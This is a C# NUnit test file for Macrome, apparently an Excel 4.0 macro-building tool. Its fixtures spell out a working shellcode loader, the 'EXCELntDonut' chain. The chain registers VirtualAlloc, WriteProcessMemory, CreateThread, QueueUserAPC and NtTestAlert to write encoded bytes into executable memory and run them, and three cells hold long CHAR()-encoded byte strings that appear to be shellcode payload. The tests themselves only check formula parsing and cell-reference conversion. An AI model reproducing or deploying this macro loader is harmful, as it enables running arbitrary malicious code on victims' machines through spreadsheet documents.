using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Macrome;
using NUnit.Framework;

namespace UnitTests
{
    [TestFixture]
    public class MacroTests
    {
        [Test]
        public void TestImportEXCELntDonutCells()
        {
            string cell1 =
                "=CHAR(235)&CHAR(35)&CHAR(91)&CHAR(137)&CHAR(223)&CHAR(176)&CHAR(91)&CHAR(252)&CHAR(174)&CHAR(117)&CHAR(253)&CHAR(137)&CHAR(249)&CHAR(137)&CHAR(222)&CHAR(138)&CHAR(6)&CHAR(48)&CHAR(7)&CHAR(71)&CHAR(102)&CHAR(129)&CHAR(63)&CHAR(8)&CHAR(32)&CHAR(116)&CHAR(8)&CHAR(70)&CHAR(128)&CHAR(62)&CHAR(91)&CHAR(117)&CHAR(238)&CHAR(235)&CHAR(234)&CHAR(255)&CHAR(225)&CHAR(232)&CHAR(216)&CHAR(255)&CHAR(255)&CHAR(255)&CHAR(9)&CHAR(1)&CHAR(2)&CHAR(7)&CHAR(7)&CHAR(5)&CHAR(7)&CHAR(7)&CHAR(9)&CHAR(5)&CHAR(7)&CHAR(5)&CHAR(6)&CHAR(13)&CHAR(11)&CHAR(6)&CHAR(7)&CHAR(9)&CHAR(9)&CHAR(7)&CHAR(7)&CHAR(9)&CHAR(10)&CHAR(7)&CHAR(4)&CHAR(2)&CHAR(10)&CHAR(13)&CHAR(7)&CHAR(5)&CHAR(7)&CHAR(5)&CHAR(14)&CHAR(9)&CHAR(9)&CHAR(9)&CHAR(7)&CHAR(10)&CHAR(6)&CHAR(11)&CHAR(9)&CHAR(2)&CHAR(9)&CHAR(9)&CHAR(5)&CHAR(91)&CHAR(225)&CHAR(129)&CHAR(35)&CHAR(7)&CHAR(7)&CHAR(133)&CHAR(38)&CHAR(7)&CHAR(9)&CHAR(1)&CHAR(196)&CHAR(29)&CHAR(153)&CHAR(123)&CHAR(194)&CHAR(145)&CHAR(248)&CHAR(188)&CHAR(78)&CHAR(104)&CHAR(160)&CHAR(165)&CHAR(211)&CHAR(161)&CHAR(12)&CHAR(118)&CHAR(168)&CHAR(45)&CHAR(202)&CHAR(88)&CHAR(249)&CHAR(86)&CHAR(159)&CHAR(45)&CHAR(115)&CHAR(15)&CHAR(83)&CHAR(155)&CHAR(81)&CHAR(77)&CHAR(15)&CHAR(2)&CHAR(9)&CHAR(9)&CHAR(5)&CHAR(126)&CHAR(195)&CHAR(239)&CHAR(251)&CHAR(220)&CHAR(232)&CHAR(25)&CHAR(105)&CHAR(118)&CHAR(23)&CHAR(224)&CHAR(57)&CHAR(98)&CHAR(93)&CHAR(9)&CHAR(183)&CHAR(31)&CHAR(240)&CHAR(35)&CHAR(41)&CHAR(7)&CHAR(245)&CHAR(141)&CHAR(37)&CHAR(152)&CHAR(1)&CHAR(68)&CHAR(241)&CHAR(158)&CHAR(68)&CHAR(103)&CHAR(48)&CHAR(64)&CHAR(237)&CHAR(95)&CHAR(116)&CHAR(156)&CHAR(204)&CHAR(128)&CHAR(132)&CHAR(111)&CHAR(208)&CHAR(13)&CHAR(46)&CHAR(245)&CHAR(217)&CHAR(246)&CHAR(43)&CHAR(63)&CHAR(16)&CHAR(248)&CHAR(87)&CHAR(136)&CHAR(184)&CHAR(84)&CHAR(77)&CHAR(40)&CHAR(244)&CHAR(99)&CHAR(60)&CHAR(28)&CHAR(219)&CHAR(131)&CHAR(116)&CHAR(203)&CHAR(191)&CHAR(223)&CHAR(6)&CHAR(207)&CHAR(254)&CHAR(95)&CHAR(159)&CHAR(70)&CHAR(137)&CHAR(141)&CHAR(41)&CHAR(225)&CHAR(146)&CHAR(201)&CHAR(125)&CHAR(63)&CHAR(78)&CHAR(19)&CHAR(109)&CHAR(114)&CHAR(176)&CHAR(77)&CHAR(149)&CHAR(208)&CHAR(20)&CHAR(246)&CHAR(119)&CHAR(188)&CHAR(90)&CHAR(12)&CHAR(165)&CHAR(132)&CHAR(121)&CHAR(92)&CHAR(87)&CHAR(133)&CHAR(213)&CHAR(123)&CHAR(17)&CHAR(121)&CHAR(16)&CHAR(206)&CHAR(186)&CHAR(66)&CHAR(243)&CHAR(94)&CHAR(152)&CHAR(189)&CHAR(155)&CHAR(200)&CHAR(165)&CHAR(16)&CHAR(203)&CHAR(78)&CHAR(133)&CHAR(196)&CHAR(149)";
            string cell2 =
                "=CHAR(204)&CHAR(204)&CHAR(68)&CHAR(86)&CHAR(113)&CHAR(118)&CHAR(244)&CHAR(128)&CHAR(99)&CHAR(124)&CHAR(226)&CHAR(175)&CHAR(92)&CHAR(54)&CHAR(79)&CHAR(241)&CHAR(17)&CHAR(198)&CHAR(185)&CHAR(147)&CHAR(255)&CHAR(127)&CHAR(61)&CHAR(173)&CHAR(127)&CHAR(19)&CHAR(35)&CHAR(87)&CHAR(132)&CHAR(189)&CHAR(190)&CHAR(223)&CHAR(223)&CHAR(218)&CHAR(250)&CHAR(223)&CHAR(152)&CHAR(67)&CHAR(38)&CHAR(48)&CHAR(30)&CHAR(232)&CHAR(223)&CHAR(91)&CHAR(159)&CHAR(104)&CHAR(236)&CHAR(142)&CHAR(73)&CHAR(13)&CHAR(25)&CHAR(139)&CHAR(219)&CHAR(115)&CHAR(141)&CHAR(185)&CHAR(143)&CHAR(66)&CHAR(49)&CHAR(47)&CHAR(219)&CHAR(125)&CHAR(25)&CHAR(214)&CHAR(16)&CHAR(27)&CHAR(104)&CHAR(165)&CHAR(186)&CHAR(36)&CHAR(13)&CHAR(143)&CHAR(154)&CHAR(87)&CHAR(74)&CHAR(142)&CHAR(115)&CHAR(158)&CHAR(220)&CHAR(83)&CHAR(73)&CHAR(194)&CHAR(156)&CHAR(1)&CHAR(242)&CHAR(234)&CHAR(15)&CHAR(99)&CHAR(70)&CHAR(90)&CHAR(85)&CHAR(119)&CHAR(171)&CHAR(62)&CHAR(175)&CHAR(15)&CHAR(210)&CHAR(237)&CHAR(28)&CHAR(65)&CHAR(118)&CHAR(229)&CHAR(219)&CHAR(80)&CHAR(97)&CHAR(46)&CHAR(98)&CHAR(178)&CHAR(158)&CHAR(27)&CHAR(255)&CHAR(69)&CHAR(2)&CHAR(43)&CHAR(241)&CHAR(226)&CHAR(226)&CHAR(143)&CHAR(153)&CHAR(167)&CHAR(1)&CHAR(49)&CHAR(71)&CHAR(13)&CHAR(166)&CHAR(187)&CHAR(77)&CHAR(150)&CHAR(103)&CHAR(43)&CHAR(27)&CHAR(200)&CHAR(151)&CHAR(15)&CHAR(211)&CHAR(205)&CHAR(166)&CHAR(6)&CHAR(241)&CHAR(8)&CHAR(244)&CHAR(52)&CHAR(99)&CHAR(125)&CHAR(143)&CHAR(126)&CHAR(119)&CHAR(231)&CHAR(176)&CHAR(184)&CHAR(236)&CHAR(244)&CHAR(90)&CHAR(255)&CHAR(46)&CHAR(240)&CHAR(119)&CHAR(180)&CHAR(122)&CHAR(156)&CHAR(7)&CHAR(227)&CHAR(222)&CHAR(37)&CHAR(63)&CHAR(38)&CHAR(161)&CHAR(246)&CHAR(116)&CHAR(96)&CHAR(118)&CHAR(33)&CHAR(78)&CHAR(93)&CHAR(240)&CHAR(66)&CHAR(115)&CHAR(110)&CHAR(67)&CHAR(223)&CHAR(83)&CHAR(47)&CHAR(76)&CHAR(38)&CHAR(116)&CHAR(108)&CHAR(205)&CHAR(9)&CHAR(213)&CHAR(2)&CHAR(182)&CHAR(63)&CHAR(172)&CHAR(52)&CHAR(165)&CHAR(50)&CHAR(246)&CHAR(5)&CHAR(202)&CHAR(242)&CHAR(77)&CHAR(214)&CHAR(137)&CHAR(49)&CHAR(24)&CHAR(177)&CHAR(71)&CHAR(122)&CHAR(81)&CHAR(18)&CHAR(13)&CHAR(10)&CHAR(158)&CHAR(63)&CHAR(7)&CHAR(234)&CHAR(205)&CHAR(102)&CHAR(254)&CHAR(25)&CHAR(254)&CHAR(110)&CHAR(229)&CHAR(137)&CHAR(59)&CHAR(84)&CHAR(114)&CHAR(118)&CHAR(155)&CHAR(147)&CHAR(127)&CHAR(224)&CHAR(113)&CHAR(243)&CHAR(237)&CHAR(106)&CHAR(146)&CHAR(22)&CHAR(204)&CHAR(81)&CHAR(199)&CHAR(210)&CHAR(9)&CHAR(65)&CHAR(37)&CHAR(78)&CHAR(178)&CHAR(118)&CHAR(157)&CHAR(103)&CHAR(152)&CHAR(93)&CHAR(220)&CHAR(4)&CHAR(44)";
            string cell3 =
                "=CHAR(219)&CHAR(163)&CHAR(12)&CHAR(18)&CHAR(73)&CHAR(24)&CHAR(125)&CHAR(89)&CHAR(155)&CHAR(59)&CHAR(140)&CHAR(64)&CHAR(150)&CHAR(156)&CHAR(168)&CHAR(82)&CHAR(91)&CHAR(233)&CHAR(136)&CHAR(139)&CHAR(197)&CHAR(196)&CHAR(77)&CHAR(6)&CHAR(147)&CHAR(92)&CHAR(3)&CHAR(4)&CHAR(174)&CHAR(90)&CHAR(87)&CHAR(173)&CHAR(181)&CHAR(170)&CHAR(189)&CHAR(51)&CHAR(139)&CHAR(160)&CHAR(66)&CHAR(41)&CHAR(69)&CHAR(138)&CHAR(218)&CHAR(103)&CHAR(106)&CHAR(190)&CHAR(105)&CHAR(87)&CHAR(32)&CHAR(11)&CHAR(155)&CHAR(228)&CHAR(118)&CHAR(217)&CHAR(37)&CHAR(140)&CHAR(63)&CHAR(16)&CHAR(189)&CHAR(19)&CHAR(55)&CHAR(213)&CHAR(20)&CHAR(200)&CHAR(250)&CHAR(119)&CHAR(236)&CHAR(242)&CHAR(29)&CHAR(239)&CHAR(11)&CHAR(3)&CHAR(3)&CHAR(7)&CHAR(10)&CHAR(3)&CHAR(5)&CHAR(2)&CHAR(17)&CHAR(7)&CHAR(2)&CHAR(3)&CHAR(5)&CHAR(7)&CHAR(10)&CHAR(7)&CHAR(6)&CHAR(3)&CHAR(2)&CHAR(3)&CHAR(13)&CHAR(2)&CHAR(3)&CHAR(3)&CHAR(5)&CHAR(7)&CHAR(5)&CHAR(3)&CHAR(3)&CHAR(3)&CHAR(6)&CHAR(7)&CHAR(6)&CHAR(7)&CHAR(11)&CHAR(9)&CHAR(7)&CHAR(9)&CHAR(5)&CHAR(9)&CHAR(5)&CHAR(10)&CHAR(3)&CHAR(2)&CHAR(5)&CHAR(3)&CHAR(6)&CHAR(7)&CHAR(6)&CHAR(3)&CHAR(5)&CHAR(7)&CHAR(7)&CHAR(6)&CHAR(9)&CHAR(3)&CHAR(2)&CHAR(5)&CHAR(5)&CHAR(7)&CHAR(2)&CHAR(7)&CHAR(3)&CHAR(6)&CHAR(9)&CHAR(5)&CHAR(6)&CHAR(7)&CHAR(11)&CHAR(3)&CHAR(3)&CHAR(7)&CHAR(10)&CHAR(3)&CHAR(5)&CHAR(2)&CHAR(17)&CHAR(7)&CHAR(2)&CHAR(3)&CHAR(5)&CHAR(7)&CHAR(10)&CHAR(7)&CHAR(6)&CHAR(3)&CHAR(2)&CHAR(3)&CHAR(13)&CHAR(2)&CHAR(3)&CHAR(3)&CHAR(5)&CHAR(7)&CHAR(5)&CHAR(3)&CHAR(2)&CHAR(3)&CHAR(6)&CHAR(7)&CHAR(5)&CHAR(7)&CHAR(11)&CHAR(9)&CHAR(7)&CHAR(9)&CHAR(5)&CHAR(9)&CHAR(5)&CHAR(10)&CHAR(3)&CHAR(2)&CHAR(246)&CHAR(251)&CHAR(69)&CHAR(200)&CHAR(157)&CHAR(20)&CHAR(40)&CHAR(81)&CHAR(106)&CHAR(205)&CHAR(205)&CHAR(227)&CHAR(127)&CHAR(58)&CHAR(83)&CHAR(150)&CHAR(150)&CHAR(149)&CHAR(126)&CHAR(34)&CHAR(178)&CHAR(244)&CHAR(81)&CHAR(225)&CHAR(177)&CHAR(192)&CHAR(212)&CHAR(24)&CHAR(157)&CHAR(19)&CHAR(105)&CHAR(156)&CHAR(91)&CHAR(46)&CHAR(166)&CHAR(48)&CHAR(220)&CHAR(241)&CHAR(212)&CHAR(207)&CHAR(60)&CHAR(70)&CHAR(4)&CHAR(139)&CHAR(85)&CHAR(48)&CHAR(138)&CHAR(201)&CHAR(148)&CHAR(66)&CHAR(128)&CHAR(105)&CHAR(195)&CHAR(90)&CHAR(53)&CHAR(238)&CHAR(70)&CHAR(88)&CHAR(70)&CHAR(250)&CHAR(142)&CHAR(71)&CHAR(190)&CHAR(32)&CHAR(126)&CHAR(41)&CHAR(1)&CHAR(104)&CHAR(17)&CHAR(86)&CHAR(94)&CHAR(127)&CHAR(84)";

            List<string> cells = new List<string>() {cell1, cell2, cell3};

            List<string> importedMacros = MacroPatterns.ImportMacroPattern(cells);

            Assert.AreEqual(3, importedMacros.Count);
            Assert.AreEqual(255, importedMacros[0].Length);
            Assert.AreEqual(255, importedMacros[1].Length);
            Assert.AreEqual(255, importedMacros[2].Length);
        }

        [Test]
        public void ReplaceSelectAndActiveCell()
        {
            List<string> excelntdonutMacros = new List<string>()
            {
                "=SELECT(B1:B111,B1)",
                "=WHILE(ACTIVE.CELL()<>\"excel\")",
                "=SET.VALUE(D2,LEN(ACTIVE.CELL()))",
                "=WProcessMemory(-1,A10+(D1*255),ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)",
                "=SELECT(,\"R[1]C\")",
                "=SELECT(C1:C1939,C1)",
                "=WHILE(ACTIVE.CELL()<>\"EXCEL\")",
                "=SET.VALUE(D2,LEN(ACTIVE.CELL()))",
                "=RTL(A22+(D1*10),ACTIVE.CELL(),LEN(ACTIVE.CELL()))",
                "=SELECT(,\"R[1]C\")",
            };

            string testVarName = "AVar";

            List<string> replacedCells = excelntdonutMacros.Select(s => MacroPatterns.ReplaceSelectActiveCellFormula(s, testVarName))
                .ToList();

            Assert.AreEqual("AVar=B1", replacedCells[0]);
            Assert.AreEqual("=WHILE(AVar<>\"excel\")", replacedCells[1]);
            Assert.AreEqual("=SET.VALUE(D2,LEN(AVar))", replacedCells[2]);
            Assert.AreEqual("=WProcessMemory(-1,A10+(D1*255),AVar,LEN(AVar),0)",replacedCells[3]);
            Assert.AreEqual("AVar=ABSREF(\"R[1]C\",AVar)", replacedCells[4]);
        }

        [Test]
        public void TestA1R1C1Remapping()
        {
            List<string> excelntdonutMacros = new List<string>()
            {
                "=GOTO(A2)",
                "=GOTO(A3)",
                "=GOTO(A4)",
                "=GOTO(A5)",
                "=GOTO(A6)",
                "=REGISTER(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",\"Valloc\",,1,9)",
                "=REGISTER(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",\"WProcessMemory\",,1,9)",
                "=REGISTER(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",\"CThread\",,1,9)",
                "=IF(ISNUMBER(SEARCH(\"32\",GET.WORKSPACE(1))),GOTO(A10),GOTO(A21))",
                "=Valloc(0,65536,4096,64)",
                "=SELECT(B1:B111,B1)",
                "=SET.VALUE(D1,0)",
                "=EVALUATE(\"B1\")",
                "=EVALUATE(\"=B1\")",
                "šœƒ=B1",
                "=WHILE(ACTIVE.CELL()<>\"excel\")",
                "=SET.VALUE(D2,LEN(ACTIVE.CELL()))",
                "=WProcessMemory(-1,A10+(D1*255),ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)",
                "=SET.VALUE(D1,D1+1)",
                "=SELECT(,\"R[1]C\")",
                "=NEXT()",
                "=CThread(0,0,A10,0,0,0)",
                "=HALT()",
                "1342439424",
                "0",
                "=WHILE(A22=0)",
                "=SET.VALUE(A22,Valloc(A21,65536,12288,64))",
                "=SET.VALUE(A21,A21+262144)",
                "=NEXT()",
                "=REGISTER(\"Kernel32\",\"RtlCopyMemory\",\"JJCJ\",\"RTL\",,1,9)",
                "=REGISTER(\"Kernel32\",\"QueueUserAPC\",\"JJJJ\",\"Queue\",,1,9)",
                "=REGISTER(\"ntdll\",\"NtTestAlert\",\"J\",\"Go\",,1,9)",
                "=SELECT(C1:C1939,C1)",
                "=SET.VALUE(D1,0)",
                "=WHILE(ACTIVE.CELL()<>\"EXCEL\")",
                "=SET.VALUE(D2,LEN(ACTIVE.CELL()))",
                "=RTL(A22+(D1*10),ACTIVE.CELL(),LEN(ACTIVE.CELL()))",
                "=SET.VALUE(D1,D1+1)",
                "=SELECT(,\"R[1]C\")",
                "=NEXT()",
                "=Queue(A22,-2,0)",
                "=Go()",
                "=SET.VALUE(A22,0)",
                "=HALT()"
            };

            List<string> importedMacros = excelntdonutMacros.Select(MacroPatterns.ConvertA1StringToR1C1String).ToList();

            Assert.AreEqual("=GOTO(R2C1)", importedMacros[0]);
            Assert.AreEqual("=GOTO(R3C1)", importedMacros[1]);
            Assert.AreEqual("=GOTO(R4C1)", importedMacros[2]);
            Assert.AreEqual("=GOTO(R5C1)", importedMacros[3]);
            Assert.AreEqual("=GOTO(R6C1)", importedMacros[4]);
            Assert.AreEqual("=IF(ISNUMBER(SEARCH(\"32\",GET.WORKSPACE(1))),GOTO(R10C1),GOTO(R21C1))",
            importedMacros[8]);
            Assert.AreEqual("=SELECT(R1C2:R111C2,R1C2)", importedMacros[10]);
            Assert.AreEqual("=SET.VALUE(R1C4,0)", importedMacros[11]);
            Assert.AreEqual("=EVALUATE(\"B1\")", importedMacros[12]);
            Assert.AreEqual("=EVALUATE(\"=B1\")", importedMacros[13]);
            Assert.AreEqual("šœƒ=R1C2", importedMacros[14]);
        }
    }
}
